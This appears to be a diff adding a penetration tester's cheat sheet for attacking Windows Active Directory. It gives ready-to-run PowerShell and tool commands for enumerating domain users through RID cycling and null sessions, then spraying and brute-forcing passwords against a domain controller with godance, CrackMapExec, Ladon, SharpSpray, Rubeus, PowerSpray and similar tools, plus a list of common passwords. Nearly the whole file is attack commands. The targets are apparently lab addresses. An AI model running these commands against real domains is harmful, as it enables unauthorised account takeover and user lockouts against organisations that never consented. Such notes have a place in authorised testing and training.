@@ -1,0 +1,393 @@
+
+Open Up PowerShell and set the variables 
+
+$global:target="192.168.80.50";$global:domain = "SECURE.local";$global:userlist = "users.txt"
+
+.\get-users_wmic.ps1
+
+RID Cycling 
+
+.\get-users_winscanx.ps1 $target
+.\get-users_dumpusers.ps1 $target
+
+
+will create users.txt in folder 
+can then use the scripts to run 
+
+.\brute_godance.ps1 $target
+.\brute_cme.ps1 $target
+.\brute_rubeus.ps1 $target
+.\brute_domainpassspray.ps1 $target
+
+
+
+
+
+
+
+####################################
+ .\winfo.exe 
+####################################
+This is a bit buggy dont spam it 
+Sometimes this cant olong 
+
+.\winfo.exe <DC IP>
+ 
+copy thr users into notepad++
+Edit > Line Operators > Remove Empty Lines 
+find and replace ' * '  with noththing 
+ 
+can get local users too 
+
+.\winfo.exe 127.0.0.1
+
+
+
+
+
+
+
+
+
+####################################
+enum
+####################################
+
+# powershell Get list of users 
+
+.\get-users_enum.ps1 [IP ADDRESS]
+
+# RID Cycle - NULL Sessions. Get Users
+
+$(.\enum.exe -U 172.16.0.10 | Select-String -NotMatch -Pattern "server: ", "setting up session", "getting user list", "cleaning up") -Split " " | Where { $_.Replace(";","")}
+
+
+
+
+
+
+
+
+####################################
+dumpusers
+####################################
+
+.\get-users_dumpusers.ps1 [IP ADDRESS]
+
+.\dumpusers.exe -target 192.168.80.50 -type dc -start 300 -stop 2000 -mode verbose
+
+$(.\dumpusers.exe -target 192.168.80.50 -type dc -start 300 -stop 2000 -mode verbose) -Split '\\' | findstr /v "Account name" | findstr /v '\$' | Select-String -NotMatch " " | Tee users.txt
+
+
+
+
+
+
+
+
+####################################
+Godance 
+#####################################
+
+# password
+.\godance_386.exe -d $domain -u $userlist -w pass_password.txt -h $target >> godance_brute.txt; Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique | Tee godance_brute_cracked.txt
+
+# pass5.txt
+.\godance_386.exe -d $domain -u $userlist -w pass5.txt -h $target >> godance_brute.txt; Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique | Tee godance_brute_cracked.txt
+
+# user = password 
+ForEach ($user in Get-Content $userlist) {
+echo $user | Out-File -Encoding ascii tempuser.txt | tee godance_brute.txt
+.\godance_386.exe -d $domain -u tempuser.txt -w tempuser.txt -h $target >> godance_brute.txt
+del tempuser.txt
+} 
+Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique | Tee godance_brute_cracked.txt
+
+# blank password
+.\godance_386.exe -d $domain -u $userlist -w  pass_blank.txt -h $target >> godance_brute.txt; Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique | Tee godance_brute_cracked.txt
+
+# pass10.txt
+.\godance_386.exe -d $domain -u $userlist -w pass10.txt -h $target >> godance_brute.txt
+
+
+# passlist 
+.\godance_386.exe -d $domain -u $userlist -w pass100.txt -h $target >> godance_brute.txt; Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique | Tee godance_brute_cracked.txt
+
+
+
+
+
+
+
+
+
+
+
+####################################
+CrackMapExecWin
+#####################################
+
+ForEach ($i in $(Get-Content .\users.txt)) { .\crackmapexec.exe -d $domain $target -u $user -p password | tee cme_brute.txt }
+
+
+# password 
+ForEach ($user in Get-Content $userlist) {
+.\crackmapexec.exe -d $domain $target -u $user -p password | tee cme_brute.txt
+Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
+}
+
+# user = password
+ForEach ($user in Get-Content $userlist) {
+.\crackmapexec.exe -d $domain $target -u $user -p $user | tee cme_brute.txt
+Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
+}  
+
+# pass5.txt
+ForEach ($user in Get-Content $userlist) {
+.\crackmapexec.exe -d $domain $target -u $user -p pass5.txt | tee cme_brute.txt
+Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
+}  
+
+# pass_blank.txt
+ForEach ($user in Get-Content $userlist) {
+.\crackmapexec.exe -d $domain $target -u $user -p pass_blank.txt | tee cme_brute.txt
+Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
+}  
+
+# pass10.txt
+ForEach ($user in Get-Content $userlist) {
+.\crackmapexec.exe -d $domain $target -u $user -p pass10.txt | tee cme_brute.txt
+Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
+}  
+
+# pass100.txt
+ForEach ($user in Get-Content $userlist) {
+.\crackmapexec.exe -d $domain $target -u $user -p pass100.txt | tee cme_brute.txt
+Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
+}  
+
+Get-Content .\cme_brute_cracked.txt
+
+
+
+
+
+
+
+
+
+####################################
+Ladon
+####################################
+ 
+it only likes the following file types so need to make sure they are in the root folder with ladon.exe
+	user.txt
+	pass.txt
+
+$global:target="192.168.80.50"
+
+# password
+type users.txt > user.txt;type pass_password.txt > pass.txt;.\Ladon.exe $target smbscan;Get-Content SmbScan.log |sort-object| Get-Unique 
+
+# pass5
+type users.txt > user.txt;type pass5.txt > pass.txt;.\Ladon.exe $target smbscan;Get-Content SmbScan.log |sort-object| Get-Unique 
+
+# user = password
+type users.txt > user.txt;type users.txt > pass.txt;.\Ladon.exe $target smbscan;Get-Content SmbScan.log |sort-object| Get-Unique 
+
+# pass_blank
+type users.txt > user.txt;type pass_blank.txt > pass.txt;.\Ladon.exe $target smbscan;Get-Content SmbScan.log |sort-object| Get-Unique 
+
+# pass10
+type users.txt > user.txt;type pass10.txt > pass.txt;.\Ladon.exe $target smbscan;Get-Content SmbScan.log |sort-object| Get-Unique 
+
+
+.\Ladon.exe 192.168.80.50 wmiscan
+
+
+
+
+
+
+
+####################################
+SharpDomainSpary - Needs .Net 3
+####################################
+
+# password
+.\SharpDomainSpray.exe password 
+
+# pass5.txt
+ForEach ($pass in Get-Content pass5.txt) {.\SharpDomainSpray.exe $pass | Tee -Append SharpDomainSpray.txt}; Get-Content SharpDomainSpray.txt |sort-object| Get-Unique 
+
+# pass10.txt
+ForEach ($pass in Get-Content pass10.txt) {.\SharpDomainSpray.exe $pass | Tee -Append SharpDomainSpray.txt}; Get-Content SharpDomainSpray.txt |sort-object| Get-Unique 
+
+# pass100.txt
+ForEach ($pass in Get-Content pass100.txt) {.\SharpDomainSpray.exe $pass | Tee -Append SharpDomainSpray.txt}; Get-Content SharpDomainSpray.txt |sort-object| Get-Unique 
+
+
+
+
+
+
+
+
+
+####################################
+SharpSpray - Needs .NET
+####################################
+
+# Scripts - will cycle through quite a few passwords 
+.\brute_sharpspray.ps1
+
+# Spary password 
+.\SharpSpray.exe -v --Force -u .\users.txt -p password  | Select-String SUCCESS
+
+# get a list of users 
+.\SharpSpray.exe -v --Force  --get-users-list | findstr /v "["
+.\SharpSpray.exe --get-users-list --Force | Out-File -Encoding ascii users.txt
+
+# Spary x5 passwords
+.\SharpSpray.exe --Force -w 0 -s 3 -j 1 -x -p "password|Password123!!|nimda|Secret123|password1" -o C:\Windows\Temp\sharpspray.txt
+
+
+
+
+
+
+
+
+####################################
+SharpMapExec - Needs .NET
+####################################
+
+SharpMapExec.exe kerbspray /users:users.txt /passwords:pass_password.txt /domain:INSECURE.local /dc:DC
+
+
+
+
+
+
+
+####################################
+PowerBrueLogon - Powershell
+####################################
+
+Import-Module .\PowerBruteLogon.ps1
+
+
+
+
+
+
+
+
+
+
+
+####################################
+DomainPasswordSpray - Powershell
+####################################
+
+Import-Module .\DomainPasswordSpray.ps1
+
+Invoke-DomainPasswordSpray -Password password -Force 2>$null | Tee DomainPasswordSpray.log
+
+
+####################################
+Invoke-BruteForce
+####################################
+
+Import-Module .\Invoke-BruteForce.ps1
+
+# password 
+
+Invoke-BruteForce -UserList .\users.txt -PasswordList .\pass_password.txt -Service ActiveDirectory -ComputerName 172.16.0.10
+
+
+# pass5
+Invoke-BruteForce -UserList .\users.txt -PasswordList .\pass5.txt -Service ActiveDirectory -ComputerName 172.16.0.10
+
+
+
+
+
+####################################
+WinBruteLogon - exe
+####################################
+https://github.com/DarkCoderSc/win-brute-logon
+
+
+foreach ($i in $(Get-Content .\users.txt)) { .\winbrutelogon.exe -u $i -v -d insecure.local -w .\pass_password.txt | Tee -Append winbrutelogon.txt }
+
+cat winbrutelogon.txt | Select-String "\[ OK \]"
+
+
+
+
+
+
+
+
+####################################
+PowerSpray  - Powershell
+####################################
+
+make sure to have -Sleep 0 -Delay 0
+
+Import-Module .\PowerSpray.ps1
+
+PowerSpray -Sleep 0 -Delay 0 -Passwords "password" | Select-String Successfully
+
+PowerSpray -Sleep 0 -Delay 0 -Passwords "password,Password123,nimda,password1,Secret123" | Select-String Successfully
+
+PowerSpray -Sleep 0 -Delay 0 -Passwords "password,nimda,Secret123,Password123!!,password1,Password1!,P@55w0rd,PASSWORD,Password123,password123,qwerty,qwerty123,abc123,1q2w3e,crest,csas,qwertyuiop,000000,111111,12345,123456,1234567,12345678,123456789,1234567890,123123,987654321,654321,iloveyou,Nothing,Adin,letmein,monkey,dragon, " | Select-String Successfully
+
+
+
+
+
+####################################
+SMBCrack2 - exe
+####################################
+
+smbcrack2.exe -i 172.16.0.10 -u users.txt -p pass_password.txt -P 1 -N -v
+
+smbcrack2.exe -i 172.16.0.10 -u users.txt -p pass5.txt -P 1 -N -v
+
+
+
+
+
+
+
+####################################
+Rubeus - .NET 3.5 
+####################################
+
+# pass5.txt
+.\Rubeus.exe brute /passwords:pass5.txt /users:users.txt /domain:insecure.local /dc:192.168.80.50 | Tee rubeus.txt
+
+# password 
+.\Rubeus.exe brute /password:password /users:users.txt /domain:insecure.local /dc:192.168.80.50 | Tee rubeus.txt
+
+
+
+
+####################################
+Invoke-CleverSpray.ps1
+####################################
+
+need to first import 
+
+Import-Module .\Invoke-CleverSpray.ps1
+
+Invoke-CleverSpray -Password "Passw0rd"
+
+Invoke-CleverSpray -PasswordFile ".\pass5.txt.txt"
+
+
+
+
+
